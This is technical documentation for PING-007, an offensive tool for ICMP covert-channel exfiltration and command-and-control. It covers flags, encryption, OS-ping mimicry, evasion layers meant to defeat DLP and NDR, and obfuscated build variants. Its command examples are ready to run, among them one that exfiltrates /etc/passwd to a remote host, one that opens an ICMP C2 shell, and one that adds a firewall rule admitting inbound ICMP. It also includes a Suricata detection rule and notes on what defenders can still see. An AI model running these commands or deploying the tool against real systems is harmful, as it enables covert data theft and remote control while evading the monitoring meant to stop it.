# PING-007 - Technical Documentation

> Full online version: [franckferman.github.io/ping-007](https://franckferman.github.io/ping-007)

---

## Table of Contents

1. [Privileges](#1-privileges)
2. [Flag Reference](#2-flag-reference)
3. [Encryption Modes](#3-encryption-modes)
4. [OS Signature Profiles](#4-os-signature-profiles)
5. [OPSEC Architecture](#5-opsec-architecture)
6. [Why Enterprise DLP Cannot See This](#6-why-enterprise-dlp-cannot-see-this)
7. [Cryptographic Details](#7-cryptographic-details)
8. [APT-Grade ICMP Tools in the Wild](#8-apt-grade-icmp-tools-in-the-wild)
9. [Build Variants](#9-build-variants)
10. [Makefile Shortcuts](#10-makefile-shortcuts)
11. [Testing](#11-testing)
12. [References](#12-references)

---

## 1. Privileges

### Why root is required

PING-007 opens a raw ICMP socket to craft outgoing packets (custom OS signature, XOR steganography) and capture **all** incoming ICMP traffic on the interface. The kernel gates this behind `CAP_NET_RAW` because raw sockets can sniff traffic and forge arbitrary source IPs.

**This is not a PING-007 limitation - it is a property of the technique itself.** The two documented APT tools that used ICMP as a primary C2 channel (Pingback 2021, PingPull/GALLIUM 2022) had the exact same constraint. In real engagements, PING-007 is deployed post-exploitation, once a privileged shell is available.

### Linux / macOS

```bash
# Standard - run as root
sudo ./build/ping-007 listen -o ./loot -p "key"

# Alternative - assign capability to the binary (dev/lab only)
sudo setcap cap_net_raw+ep ./build/ping-007
./build/ping-007 listen -o ./loot -p "key"
```

> **OPSEC warning on `setcap`:** the capability is stored in the file's extended attributes and is readable by anyone (`getcap ./build/ping-007`). In real operations, use `sudo` or a root shell - no persistent artifact on the binary.

### Windows

```powershell
# Right-click terminal → "Run as Administrator", then:
.\build\ping-007.exe listen -o .\loot -p "key"
```

| Issue | Detail |
|-------|--------|
| **Privilege** | Administrator mandatory - no `setcap` equivalent |
| **Firewall** | Windows Defender blocks inbound ICMP by default (outbound works without changes) |
| **Loopback** | Raw sockets cannot receive packets sent to `127.0.0.1` on Windows |
| **Source IP** | Cannot be spoofed - Windows enforces a valid local IP |
| **Tested** | Cross-compiled but **not validated end-to-end on Windows** - use Linux for critical ops |

```powershell
# Allow inbound ICMP on the local host firewall (listener side only)
netsh advfirewall firewall add rule name="ICMP Allow" protocol=icmpv4:8,any dir=in action=allow

# Remove after testing
netsh advfirewall firewall delete rule name="ICMP Allow"
```

---

## 2. Flag Reference

### Global flags (all commands)

| Flag | Default | Description |
|------|---------|-------------|
| `-p, --password` | - | Shared password for AES-256-GCM + PBKDF2 key derivation |
| `-v, --verbose` | false | Verbose logging |
| `--no-banner` | false | Suppress startup banner and JSON logs |
| `-c, --config` | `./config/ping-007.yml` | Config file path |
| `--allow-all-targets` | false | Bypass `authorized_targets` / `forbidden_targets` CIDR validation - use in lab or red team ops where the config whitelist blocks the actual target |

### `basic`

| Flag | Default | Description |
|------|---------|-------------|
| `-t, --target` | **required** | Target IP address |
| `-d, --data` | - | Inline data to transmit |
| `--signature` | `linux` | OS ping signature to mimic (`linux`, `windows`, `none`) |
| `--no-signature` | false | Raw ICMP, no OS pattern |
| `-s, --stealth` | false | Force stealth mode (64-byte, proper timing) |
| `--delay` | 0 | Pre-transmission delay (e.g. `2s`, `500ms`) |
| `--human-timing` | false | Random 1–5s intervals between packets |
| `--ultra-stealth` | false | Maximum evasion (timing + size + pattern) |
| `--decoy-pings` | 0 | Send N clean OS-pattern pings before data |
| `--after-pings` | 0 | Send N clean pings after data to close the session naturally |
| `--ping-interval` | `1s` | Interval between pings in a sequence |
| `--icmp-id` | `os` | ICMP identifier: `os` (PID on Linux / `0x0001` on Windows), `random`, or a 0–65535 integer |
| `--no-encrypt` | false | Send plaintext - no encryption, no encoding |
| `--encode` | false | Base64-encode payload without encrypting |
| `-i, --interactive` | false | Interactive prompt mode |

### `stealth`

| Flag | Default | Description |
|------|---------|-------------|
| `-t, --target` | **required** | Target IP address |
| `-d, --data` | - | Inline data to transmit |

Shorthand for `basic` with full evasion stack enabled: sandbox detection, adaptive timing from the active timing profile, payload obfuscation, OS signature mimicry, and automatic fragmentation. Useful as a drop-in for `basic` when you want all techniques applied without specifying flags individually.

### `exfil`

| Flag | Default | Description |
|------|---------|-------------|
| `-t, --target` | **required** | Target IP address |
| `-f, --file` | **required** | File to exfiltrate |
| `--method` | `icmp_tunnel` | Transfer method (`icmp_tunnel`, `icmp_payload`) |
| `--mode` | `stealth` | Timing mode (`stealth`, `fast`, `covert`) |
| `--chunk-size` | 512 | Base chunk size in bytes (±25% jitter per chunk) |
| `--no-stealth` | false | Disable stealth techniques |
| `--no-encrypt` | false | Disable encryption |
| `--signature` | `linux` | OS signature for TTL mimicry (`linux`, `windows`, `none`) |
| `--icmp-id` | `os` | ICMP identifier: `os` (PID on Linux / `0x0001` on Windows), `random`, or a 0–65535 integer |

### `shell`

| Flag | Default | Description |
|------|---------|-------------|
| `-t, --target` | **required** | Target IP address |
| `--mode` | `interactive` | `interactive` (ICMP C2) or `batch` (local execution only) |
| `--jitter` | 0 | Max random delay before each outgoing packet (e.g. `3s`) |

### `listen`

| Flag | Default | Description |
|------|---------|-------------|
| `-o, --output` | `./received` | Output directory for received files |
| `--interface` | `eth0` | Network interface to listen on |
| `--method` | `icmp_tunnel` | Listen method (`icmp_tunnel`) |
| `--timeout` | 60 | Timeout in seconds |
| `-q, --quiet` | false | Suppress per-packet output (OpSec: verbose log is a risk) |

### `apt`

| Flag | Default | Description |
|------|---------|-------------|
| `-t, --target` | **required** | Target IP address |
| `-r, --profile` | **required** | APT profile (`lazarus`, `apt29`, `apt28`, `equation`) |
| `--duration` | 60 | Simulation duration in seconds |
| `--list` | false | Print all available timing profiles with intervals and exit (no root required) |

### `analyze`

| Flag | Default | Description |
|------|---------|-------------|
| `--duration` | 60 | Analysis duration in seconds |
| `--passive` | false | Passive mode (no raw sockets, no root required) |

### `status`

| Flag | Default | Description |
|------|---------|-------------|
| `--safe` | false | Disable all privileged operations (no root required) |
| `--no-network` | false | Skip network checks (no root required) |

### `version`

No flags. Prints version string, build timestamp, and commit hash. No root required.

---

## 3. Encryption Modes

| Situation | Command | Result |
|-----------|---------|--------|
| **No `-p` flag** | `sudo ./ping-007 basic -t <ip> -d "msg"` | **Warning: random key** - receiver can't decrypt. Non-interoperable. |
| **Shared password** | `sudo ./ping-007 basic -t <ip> -d "msg" -p "secret"` | AES-256-GCM, PBKDF2-derived key. Receiver with same `-p` decrypts automatically. |
| **No encryption** | `sudo ./ping-007 exfil -t <ip> -f file --no-encrypt` | Plaintext payload in ICMP. Receiver gets raw bytes. |

---

## 4. OS Signature Profiles

| Profile | Payload size | Stealth capacity | Frag capacity | Pattern | TTL |
|---------|-------------|-----------------|---------------|---------|-----|
| `linux` (default) | 64 bytes | 38 bytes/pkt | 34 bytes/frag | `[16B timeval][0x10,0x11,…0x37]` | 64 |
| `windows` | 40 bytes | 22 bytes/pkt | 18 bytes/frag | Alphabetic `abcdefgh…` | 128 |
| `none` / `--no-signature` | Variable | N/A | N/A | Raw bytes | kernel default |

**Stealth capacity arithmetic (Linux, 64-bit):**
- ICMP payload = 56 bytes (`ping -s 56`)
- 16 bytes = `struct timeval` (iputils on 64-bit Linux: `uint64 tv_sec` + `uint64 tv_usec`)
- 2 bytes = length prefix (XOR'd into sequential pattern starting at `0x10`)
- **38 bytes** free for hidden data per single packet
- AES-256-GCM overhead = 32 bytes (4B header + 12B nonce + 16B tag)
- Max single-packet plaintext = 6 bytes; above that, auto-fragmentation kicks in

For large payloads, data is split into N separate 64-byte ICMP echo requests with a 4-byte embedded header `[0xA7 magic][session][frag_id][total_frags]` XOR'd into the payload pattern.

---

## 5. OPSEC Architecture

| Layer | Technique | Detection avoided |
|-------|-----------|-------------------|
| **TTL** | `setsockopt(IP_TTL)` - 64 (Linux) / 128 (Windows) | OS fingerprinting via TTL |
| **Payload size** | Always 64B (Linux) / 40B (Windows) - identical to `ping -s 56` | Oversized ICMP payload detection |
| **Payload pattern** | XOR steganography into real OS ping pattern | Pattern mismatch vs. known ping tools |
| **Sequence number** | Starts at 1, increments per packet (matches iputils `ping` behaviour) | "Sequence starts at 1" heuristic — previously detectable as random start |
| **ICMP Identifier** | `getpid() & 0xFFFF` on Linux (PID of the ping-007 process); `0x0001` on Windows (Vista+ kernel value) — override with `--icmp-id <value\|random>` | Fixed arbitrary ID — now matches real OS ping behaviour |
| **Fragmentation** | Large payloads → N×64B pings with embedded frag header | Oversized single-packet detection |
| **Timing** | 1s ± 10% jitter between packets | Fixed-interval Netflow detection |
| **Session blending** | `--decoy-pings` / `--after-pings` (clean OS pings before and after) | ICMP volume anomaly on NDR/Zeek |
| **Inter-chunk gap** | 5–30s (stealth) / 30–120s (covert) between chunks | Burst transfer rate detection |
| **Shell jitter** | `--jitter <max>` random delay before each command packet | Metronomic C2 beacon detection |
| **Output verbosity** | `listen --quiet` suppresses all stdout | Live forensics / process monitoring |

### What a SOC can still detect

- **High entropy payload**: AES-GCM ciphertext has ~8 bits/byte entropy. A DPI engine with entropy scoring can flag this.
- **ICMP volume anomaly** *(rare - requires NDR or Zeek with ICMP rules)*: unusual pings to an atypical destination. `--decoy-pings` / `--after-pings` address this.
- **Same destination IP**: periodic pings to the same C2 IP in flow analysis on mature NDR. Route through IPs with pre-existing legitimate ICMP traffic.
- **Fragment magic byte `0xA7`**: matchable with a Suricata content rule at offset 8.

**Suricata rule to detect PING-007 fragment sessions:**
```
alert icmp any any -> any any (
  msg:"PING-007 stealth fragment magic byte 0xA7";
  itype:8; icode:0;
  content:"|A7|"; offset:8; depth:1;
  threshold: type both, track by_src, count 3, seconds 30;
  sid:9000001; rev:1;
)
```

---

## 6. Why Enterprise DLP Cannot See This

Enterprise DLP solutions (Symantec DLP, Forcepoint, Microsoft Purview) operate as L7 application proxies or SSL inspection engines targeting HTTP/S, SMTP, FTP and cloud APIs. ICMP is a network-layer diagnostic protocol - it has no application session, no TCP stream, and no content to proxy.

**Most DLP appliances do not decode ICMP payloads at all.**

| Field | Linux `ping -s 56` | Windows `ping` | PING-007 `--signature linux` | PING-007 `--signature windows` |
|-------|-------------------|----------------|------------------------------|--------------------------------|
| ICMP type | 8 | 8 | 8 | 8 |
| Total size | 64 bytes | 40 bytes | **64 bytes** | **40 bytes** |
| TTL | 64 | 128 | **64** | **128** |
| ICMP Identifier | `getpid() & 0xFFFF` | `0x0001` (Vista+, kernel) | **`getpid() & 0xFFFF`** | **`0x0001`** |
| Sequence start | 1, +1 per packet | arbitrary (boot counter) | **1, +1 per packet** | **1, +1 per packet** |
| Payload structure | `[16B timeval][0x10,0x11…]` | `abcdefgh…` (23-char cycle) | **same, XOR'd at byte 16** | **same, XOR'd at byte 8** |

Even if a sensor decodes the ICMP payload, it finds `[4B header][12B nonce][ciphertext][16B tag]` - pure random-looking bytes. No PII patterns, no file headers, no regex match possible.

---

## 7. Cryptographic Details

All three algorithms use **PBKDF2-SHA256 (100 000 iterations)** with a fixed per-algorithm salt for deterministic key derivation from a shared password.

| Algorithm | Key | Auth | Salt |
|-----------|-----|------|------|
| AES-256-GCM | 256-bit | AEAD | `ping007-aes-salt-v1` |
| ChaCha20-Poly1305 | 256-bit | AEAD | `ping007-chacha20-salt-v1` |
| Custom XOR-CFB-HMAC | 256-bit | HMAC-SHA256 | `ping007-xor-salt-v1` |

Wire format: `[4-byte header: algo+version][12-byte nonce][ciphertext][16-byte AEAD tag]`

The listener auto-detects the algorithm from the 4-byte header. No key material is stored in the binary - reversing the binary reveals nothing useful.

---

## 8. APT-Grade ICMP Tools in the Wild

Two tools with published technical reports have used ICMP as a primary C2 channel. All had the right premise (ICMP is largely ignored by defenders) but none attempted to make their traffic look like a real OS ping. The result: trivially detectable static signatures.

### Pingback (2021) - Trustwave SpiderLabs

Windows backdoor, unattributed. Delivered as `oci.dll` via MSDTC DLL hijacking.

**Wire format:**
```
ICMP Type 8, payload: fixed 788 bytes
Sequence number: one of {1234, 1235, 1236} only
No encryption - commands in plaintext at offset 0
```

Caught by a single Suricata rule: `alert icmp any any -> any any (itype:8; dsize:788; sid:9000010;)`

### PingPull (2022) - GALLIUM / Alloy Taurus

Chinese state-sponsored group. RAT with swappable C2 transports (ICMP / HTTPS / TCP).

**Wire format:**
```
[8-byte hardcoded prefix: 03 41 40 7E 04 37 24 70]
R[sequence_number].[PROJECT_IDENTIFIER]\r\n
total=[total_data_length]\r\n
[base64(AES-256-CBC(payload))]
```

Both AES keys were hardcoded in the binary and recovered by Unit42, making all historical traffic retrospectively decryptable. The `PROJECT_*` identifier leaked hostname, executable name, and IP in plaintext in every packet.

### Technical comparison

| | **Pingback** | **PingPull** | **PING-007** |
|---|---|---|---|
| **Packet size** | Fixed 788B | Oversized blob | **Exact OS size: 64B / 40B** |
| **Payload** | Plaintext struct | `[8B prefix]R[n].[PROJECT_…]\r\n` | **XOR'd into real OS pattern** |
| **TTL** | Kernel default | Kernel default | **`setsockopt`: 64 / 128** |
| **Sequence numbers** | Fixed {1234,1235,1236} | Incremental from 0 | **Starts at 1, +1 per packet — identical to OS ping** |
| **Encryption** | None | AES-256-CBC, **hardcoded keys** | PBKDF2 + AES-256-GCM, **no key in binary** |
| **Detectable by size?** | Yes - `dsize:788` | Yes | **No** |
| **Binary reversing?** | N/A | Yes - keys recoverable | **No** |

---

## 9. Build Variants

```bash
make build               # Standard build → build/ping-007
make build-no-c2         # No interactive shell (exfil+listen intact) → build/ping-007-noc2
make build-stealth       # -trimpath -buildmode=pie
make build-ghost         # Maximum stripping + obfuscation
make build-compressed    # UPX compression (requires upx)
make build-armored       # Stealth + UPX
make build-minimal       # No APT simulation module (-tags minimal)
make build-all           # All platforms (linux/darwin/windows, amd64/arm64)
```

---

## 10. Makefile Shortcuts

```bash
make basic TARGET=192.168.1.100 PASSWORD='secret'
make stealth TARGET=192.168.1.100 DATA='payload' PASSWORD='secret'
make exfil TARGET=192.168.1.100 FILE=/etc/passwd PASSWORD='secret'
make exfil TARGET=192.168.1.100 FILE=data.zip METHOD=icmp_tunnel MODE=fast PASSWORD='secret'
make apt TARGET=192.168.1.100 PROFILE=lazarus DURATION=300
make shell TARGET=192.168.1.100 PASSWORD='c2pass'
make listen OUTPUT=./loot TIMEOUT=300 PASSWORD='secret'
make analyze DURATION=120
make ultra-stealth TARGET=192.168.1.100 PASSWORD='stealth-key'
make ghost-mode TARGET=192.168.1.100 PASSWORD='ghost-key'
make human-mimic TARGET=192.168.1.100 PASSWORD='test'
make natural-test TARGET=192.168.1.100 COUNT=10 PASSWORD='test'
make crypto-demo
```

---

## 11. Testing

```bash
make test                # Full test suite with race detector + HTML coverage
go test ./...            # Quick run (no coverage)
go test ./internal/crypto/... -v
go test ./internal/network/... -v
go test ./internal/config/... -v
```

**252 tests across 8 packages** - all passing with `-race`. No network access or root required.

| Package | Tests | Coverage areas |
|---------|-------|----------------|
| `internal/crypto` | 49 | AES-256-GCM, ChaCha20-Poly1305, XOR-CFB-HMAC round-trips; cross-instance decrypt; PBKDF2 key derivation; algorithm auto-detection; nonce uniqueness |
| `internal/config` | 20 | Target validation (authorized/forbidden/invalid/hostname); config defaults; `LoadFrom` explicit path; `--allow-all-targets` bypass |
| `internal/network` | 31 | Packet builder; fragment reassembly; OS signature headers; checksum; ICMP parsing |
| `internal/evasion` | 30 | APT timing profiles; sandbox detection; obfuscation; adaptive delay |
| `internal/logger` | 33 | All log levels; JSON/text formats; log rotation; SIEM writer; audit logger |
| `internal/exfiltration` | 31 | Chunk creation (single/multi/jitter); CX marker protocol; encryption integration; job management |
| `internal/orchestrator` | 32 | Steganography extraction; entropy analysis; fragment reassembly; CX multi-chunk reassembly; session generation |
| `internal/shell` | 24 | Session lifecycle; jitter; response parsing; concurrent session handling |

---

## 12. References

| Claim | Source |
|-------|--------|
| DLP/firewalls don't inspect ICMP payload | [DeepStrike - What Is ICMP Tunneling?](https://deepstrike.io/blog/what-is-icmp-tunneling) |
| Windows ping payload = `abcdefghijklmnopqrstuvwabcdefghi` | [Palo Alto LIVEcommunity](https://live.paloaltonetworks.com/t5/general-topics/icmp-covert-channel-allow-only-icmp-ping-packet-that-has/td-p/259933) |
| Linux TTL=64 / Windows TTL=128 | [InfiniteLogins](https://infinitelogins.com/2020/12/12/using-ping-ttls-values-to-fingerprint-operating-systems/) · [OSTechNix](https://ostechnix.com/identify-operating-system-ttl-ping/) |
| ICMP covert channel technique | [JumpSec Labs](https://labs.jumpsec.com/covert-channels-misusing-icmp-protocol-for-file-transfers-with-scapy/) |
| Behavioral detection via NetFlow/NDR | [Vectra AI](https://www.vectra.ai/detections/icmp-tunnel) |
| Entropy analysis for ICMP | [Trisul Network Analytics](https://www.trisul.org/blog/detecting-icmp-covert-channels-through-payload-analysis/) |
| Exfiltration via ICMP - detection methods | [APNIC Blog](https://blog.apnic.net/2022/03/31/how-to-detect-and-prevent-common-data-exfiltration-attacks/) |
| Pingback malware (2021) | [Trustwave SpiderLabs](https://levelblue.com/en-us/resources/blogs/spiderlabs-blog/backdoor-at-the-end-of-the-icmp-tunnel/) · [Corelight Zeek package](https://github.com/corelight/pingback) |
| PingPull / GALLIUM (2022) | [Unit42 / Palo Alto Networks](https://unit42.paloaltonetworks.com/pingpull-gallium/) |
| ICMP tunneling tools (icmpsh, ptunnel) in the wild | [Cynet](https://www.cynet.com/attack-techniques-hands-on/how-hackers-use-icmp-tunneling-to-own-your-network/) |
| Academic - "ICMP traffic considered benign" | [Springer](https://link.springer.com/content/pdf/10.1007/978-3-540-39737-3_103.pdf) |
| Steganography in malware (in-the-wild list) | [steg-in-the-wild by lucacav](https://github.com/lucacav/steg-in-the-wild) |
